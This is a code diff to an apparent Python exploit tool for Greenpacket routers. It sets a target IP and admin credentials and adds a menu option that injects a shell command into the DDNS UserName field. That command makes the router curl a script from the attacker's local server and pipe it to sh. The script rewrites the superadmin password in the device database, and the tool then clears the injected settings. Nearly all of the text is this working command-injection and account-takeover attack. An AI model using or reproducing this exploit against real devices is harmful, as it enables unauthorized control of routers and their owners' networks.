@@ -3,12 +3,12 @@ import http.server
 import socketserver
 
 # Local settings for http payload server
-settings_localip = "192.168.0.100"
+settings_localip = "192.168.88.102"
 settings_localport = 18080
 # Greenpacket settings
-settings_remote_ip = "192.168.0.1"
-settings_user = "admin"
-settings_password = "admin"
+settings_remote_ip = "192.168.101.1"
+settings_user = "superadmin"
+settings_password = "Gr33nPacket!"
 
 class httpd:
     def __init__(self, host='localhost', port=8000, directory='.'):
@@ -150,7 +150,26 @@ if(session[0]):
                    print("Settings cleanup ok")
                 input("Done!")
             case '4':
-                print("TODO")
+                print("Adding new superadmin account...")
+                payload = ddns_cmd_inject
+                payload["UserName"] = f";timeout 5 curl http://{settings_localip}:{settings_localport}/superadmin.sh | sh;"
+
+                userpassword = ''.join(random.choices("1234567890qwertzuiopASDFGHJKLyxcvbnm", k=16))
+
+                payload_sh = open('payloads/superadmin.sh', 'w')
+                payload_sh.write(f'\n')
+                payload_sh.write(f'passwdmd5=`echo -n {userpassword} |md5sum|cut -d" " -f1`\n')
+                payload_sh.write(f'sqlite3 /data/turin/web/datas/memohi.db "UPDATE users SET password = \'$passwdmd5\' WHERE username = \'superadmin\'";\n')
+                payload_sh.close()
+
+                result1 = session_post(session_token, 'web/v1/setting/system/ddns', payload)
+                if(result1[0]):
+                    print(f"New super admin account password is set to: {userpassword}\n.")
+                time.sleep(6)
+                result2 = session_post(session_token, 'web/v1/setting/system/ddns', ddns_clear)
+                if(result2[0]):
+                   print("Settings cleanup ok")
+                input("Done!")
             case '5':
                 print("Adding new superadmin account...")
                 payload = ddns_cmd_inject
